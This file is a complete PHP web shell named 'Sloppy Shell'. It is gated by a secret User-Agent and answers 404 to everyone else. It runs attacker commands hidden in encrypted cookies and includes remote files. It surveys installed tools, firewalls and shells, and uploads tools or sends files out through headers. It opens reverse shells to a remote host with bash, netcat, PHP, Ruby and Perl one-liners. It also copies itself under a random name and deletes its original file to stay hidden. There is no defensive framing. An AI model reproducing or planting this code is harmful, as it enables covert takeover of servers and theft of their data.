<?php
//LEAVE ME HERE!!!!!!

error_reporting(E_ERROR | E_PARSE);
if ( ! defined( "PATH_SEPARATOR" ) ) {
    if (str_contains($_ENV["OS"], "Win") !== false)
        define( "PATH_SEPARATOR", ";" );
    else define( "PATH_SEPARATOR", ":" );
}
if (str_starts_with(php_uname(), 'Windows')) {
    if (!defined("sloppyshell")){
        define("sloppyshell", "cmd.exe");
    }
    define("slopos", "Windows");
} else {
    if (!defined("sloppyshell")){
        define("sloppyshell", "bash");
    }
    define("slopos", "Linux");
}
if (slopos === "Windows"){
    if (!is_dir(".\\scache")){
        mkdir(".\\scache");
        shell_exec("attrib +H .\\scache");
    }
    define("scache", getcwd()."\\scache\\");
}else{
    if (!is_dir("./.scache")){
        mkdir("./.scache");
    }
    define("scache", getcwd()."/.scache/");
}

set_include_path(get_include_path().PATH_SEPARATOR.scache);
@ini_set("safe_mode", 0);
@ini_set("file_uploads", "on");
@ini_set("max_file_uploads",20);
@ini_set("upload_max_filesize", "24G");
@ini_set("upload_tmp_dir", getcwd());

function uwumodifyme()
{
    if (is_writable(getcwd()."/".$_SERVER['PHP_SELF'])) {
        $me = file(getcwd() . "/" .$_SERVER['PHP_SELF']);
        $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))).PHP_EOL;
        $new_name = bin2hex(openssl_random_pseudo_bytes(10));
        file_put_contents(getcwd()."/".$new_name.".php", $me);
        return [
            "Successful" => "HELLYEA",
            "NewName" => "{$new_name}.php",
            "Old" => $_SERVER['PHP_SELF']
        ];
    }
    return [
        "Successful" => "HELLNO",
        "NewName" => null,
        "Old" => null
    ];
}

function banner()
{
    echo str_repeat(PHP_EOL, 3);
    $logo = [
        "\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m",
        "\033[33;40m ▐█ ▀. ██•  ▪     ▐█ ▄█▐█ ▄█▐█▪██▌    ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•   \033[0m",
        "\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m",
        "\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m",
        "\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m",
        "\033[0;36mgr33tz: Notroot && Johnny5\nH4ppy h4ck1ng\033[0m\n\n\n"
    ];
    foreach ($logo as $line){
        echo $line.PHP_EOL;
    }
}


function b64($data, $switch)
{
    echo print_r($data) . "\n";
    if ($switch === "u") {
        if (!empty($data) && is_array($data)) {
            if (!is_null($data['read'])) {
                echo "\nMake sure you have found a writable directory, otherwise this will not go through\n";
                $a = "./" . substr(str_shuffle(allowed_chars), 0, rand(3, 5));
                fputs(fopen($a, "x+"),
                    openssl_decrypt($data['Base64_Encoded_Tool'], $data['Cipher'], $data['Key'],
                        OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $data['IV'], $data['Tag'], $data['aad']));
                echo "File saved at: {$a}\nYou may want to move this file out of the current web directory, 
                so you can hide it. But this will do for now.\n";
                return true;
            }
        }
    } else {
        if (is_file($data['read'])) {
            header("FileName: " . $data['read']);
            header("File_data: " . base64_encode(file_get_contents($data['read'])));
            return true;
        }
    }
    return false;
}

function checkComs(): array
{
    $useful_commands = [];
    $lincommands = array(
        "perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
        'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
        'qemu', 'sudo', "git", "xterm", "tcl", "ruby", "postgres", "mongo", "couchdb",
        "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid", "pg_lsclusters",
        "pg_ctlcluster", "pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool",
        "psql", "mysql", "sqlite3"
    );
    foreach ($lincommands as $item) {
        $useful_commands[$item] = shell_exec("which {$item} 2>/dev/null")
            ?? "Disabled";
    }
    return $useful_commands;
}

function parseProtections(): array
{
    $prots = [];
    $protections = array(
        "selinux", "iptables", "pfctl", "firewalld", "yast",
        "yast2", "fail2ban", "denyhost", "nftables", "firewall-cmd"
    );
    foreach ($protections as $prot) {
        $prots[$prot] = shell_exec(" which {$prot} 2>/dev/null")
            ?? "Disabled";
    }
    return $prots;
}

function checkShells($os): array
{
    $usable_shells = [];
    $shells = [
        "Linux" => [
            "ksh", "csh", "zsh", "bash", "sh", "tcsh"
        ],
        "Windows" => [
            "cmd", "powershell", "pwsh"
        ]
    ];
    foreach ($shells[$os] as $shell) {
        $usable_shells[$shell] = shell_exec("which {$shell} 2>/dev/null")
            ?? "Disabled";
    }
    return $usable_shells;
}

function checkPack(): array
{
    $package_management = [];
    $packs = array(
        "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3",
        "gem", "cargo", "nuget", "ant", "emerge", "go", "rustup", "shards", "nimble"
    );
    foreach ($packs as $pack) {
        $package_management[$pack] = shell_exec("which {$pack} 2>/dev/null")
            ?? "Disabled";
    }
    return $package_management;
}

// removed cloner.



function reverseConnections($methods, $host, $port, $shell)
{
    $defaultPort = 1634;
    $defaultHost = $_SERVER["REMOTE_ADDR"];
    $defaultShell = sloppyshell;

    $useHost = null;
    $usePort = null;
    $useShell = null;

    if (empty($host)) {
        $useHost = $defaultHost;
    } else {
        $useHost = $host;
    }
    if (empty($shell)) {
        $useShell = $defaultShell;
    } else {
        $useShell = $shell;
    }
    if (empty($port)) {
        $usePort = $defaultPort;
    } else {
        $usePort = $port;
    }
    $comma = array(
        "bash" => sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", $useHost, (int)$usePort),
        "php" => sprintf("php -r '\$sock=fsockopen(\"%s\",%d);exec(\"%s -i <&3 >&3 2>&3\");'", $useHost, (int)$usePort, $useShell),
        "nc" => sprintf("nc -e %s \"%s\" %d\"", $useShell, $useHost, (int)$usePort),
        "ncS" => sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc \"%s\" %d >/tmp/f", $useHost, (int)$usePort),
        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"$useShell -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl" => sprintf("perl -e 'use Socket;\$i=\"%s\";\$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", $useHost, (int)$usePort, $useShell),
    );
    if ($methods == "default") {
        $useMethod = $comma["bash"];
    } else {
        $useMethod = $methods;
    }
    if (!empty($useMethod)) {
        echo("\nAttempting to connect back, ensure you have the listener running.\n");
        echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
        system($comma[$methods]);
        return 1;
    } else {
        echo("\nYou didnt specify a method to use, defaulting to bash.\n");
        echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
        system($useMethod);
        return 1;
    }
}


function remoteFileInclude($targetFile)
{
    if (!empty($targetFile)) {
        include (base64_decode($targetFile)) or die("Could not remote import :(\n");
    }
}

function validate_auth($agent): bool
{
    if (is_null($agent)){
        return false;
    }
    if (str_contains($agent, "sp1.1") !== false){
        return true;
    }else{
        return false;
    }
}

function normalize_for_windows($com): string
{
    $com = base64_decode($com);
    if (str_contains($com, "/") !== false){
        return str_replace($com, "/", "\\");
    }
    return $com;

}
function executeCommands($command)
{
    # Try to find a way to run our command using various PHP internals
    if (function_exists('call_user_func_array')) {
        # http://php.net/manual/en/function.call-user-func-array.php
        return call_user_func_array('system', array($command));
    } elseif (function_exists('call_user_func')) {
        # http://php.net/manual/en/function.call-user-func.php
        return call_user_func('system', $command);
    } else if (function_exists('passthru')) {
        # https://www.php.net/manual/en/function.passthru.php
        ob_start();
        passthru($command, $return_var);
        ob_end_clean();
        return $return_var;
    } else if (function_exists('system')) {
        # this is the last resort. chances are PHP Suhosin
        # has system() on a blacklist anyways :>
        # http://php.net/manual/en/function.system.php
        return system($command);
    } else if (class_exists('ReflectionFunction')) {
        # http://php.net/manual/en/class.reflectionfunction.php
        $function = new ReflectionFunction('system');
        return $function->invoke($command);
    }
    return "";
}

$ns = null;
$sk = null;
$ad = null;
$ct = null;
$split = null;

if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        banner();
        if (isset($_POST["cr"])) {
            if ($_POST['cr'] === "1") {
                $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
                executeCommands($split);
            } elseif ($_POST['cr'] === '1b') {
                $split = base64_decode($_COOKIE['jsessionid']);
                executeCommands($split);
            } else {
                $s = $_COOKIE['jsessionid'];
                $v = explode(".", base64_decode($s));
                $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
                executeCommands(base64_decode($split));
            }
        } elseif (isset($_POST["doInclude"])) {
            remoteFileInclude($_POST["doInclude"]);
        } elseif (isset($_COOKIE["cb64"])) {
            $aSX = explode(".", $_COOKIE['cb64']);
            if (hash("sha512", $_COOKIE['jsessionid'], $binary = false) === $aSX[1]) {
                $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
                try {
                    $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
                } catch (SodiumException $e) {
                    throw new Exception("I require Sodium!");
                }
                $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
                b64($axD, $aSX[0]);
            } else {
                http_response_code(444);
            }
        } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
            $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
            if (function_exists(pcntl_fork()) === true) {
                $pid = pcntl_fork();
                if ($pid === -1) {
                    die("\n\n");
                } else {
                    pcntl_wait($status);
                    reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
                }
            } else {
                echo "Cannot fork, as it does not exist on this system..... using passthru\n";
                $re = null;
                passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
            }
        }
    } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
        banner();
        if (!empty($_GET["qs"])) {
            switch ($_GET["qs"]) {
                case "cqP":
                    foreach (checkPack() as $packs => $isenabled) {
                        $isenabled = trim($isenabled);
                        if ($isenabled === "Disabled") {
                            $r = "\033[0;31m{$isenabled}\033[0m";
                        } else {
                            $r = "\033[0;36m{$isenabled}\033[0m";
                        }
                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $packs, trim($r));
                    }
                    header("X-Success: 1");
                    break;
                case "cqPR":
                    foreach (parseProtections() as $prots => $isenabled) {
                        $isenabled = trim($isenabled);
                        if ($isenabled === "Disabled") {
                            $r = "\033[0;31m{$isenabled}\033[0m";
                        } else {
                            $r = "\033[0;36m{$isenabled}\033[0m";
                        }
                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $prots, trim($r));
                    }
                    header("X-Success: 1");
                    break;
                case "cqSH":
                    foreach (checkShells(slopos) as $shells => $isenabled) {
                        $isenabled = trim($isenabled);
                        if ($isenabled === "Disabled") {
                            $r = "\033[0;31m{$isenabled}\033[0m";
                        } else {
                            $r = "\033[0;36m{$isenabled}\033[0m";
                        }
                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $shells, trim($r));
                    }
                    header("X-Success: 1");
                    break;
                case "cqCM":
                    foreach (checkComs() as $commands => $isenabled) {
                        $isenabled = trim($isenabled);
                        if ($isenabled === "Disabled") {
                            $r = "\033[0;31m{$isenabled}\033[0m";
                        } else {
                            $r = "\033[0;36m{$isenabled}\033[0m";
                        }
                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $commands, trim($r));
                    }
                    header("X-Success: 1");
                    break;
                case "cqI":
                    $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads") : "cannot set max_file_uploads";
                    $sfem = ini_get("safe_mode") ? "set to true" : "cannot set safemode.";
                    $fups = ini_get("file_uploads") ? "true" : "false";
                    $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir") : "cannot set upload_tmp_dir";
                    echo <<<INI
Max filesize: $fsize
Safemode: $sfem
File_Uploads: $fups
Upload Temp Dir: $ftd
INI. PHP_EOL;
                    header("X-Success: 1");
                    break;
            }
        } else {
            http_response_code(404);
            die();
        }
    } else {
        http_response_code(404);
        die();
    }
    foreach (uwumodifyme() as $new_data => $d){
        header("{$new_data}: {$d}");
    }
    unlink($_SERVER['SCRIPT_FILENAME']);
    http_response_code(404);
    die();
}
http_response_code(404);
die();
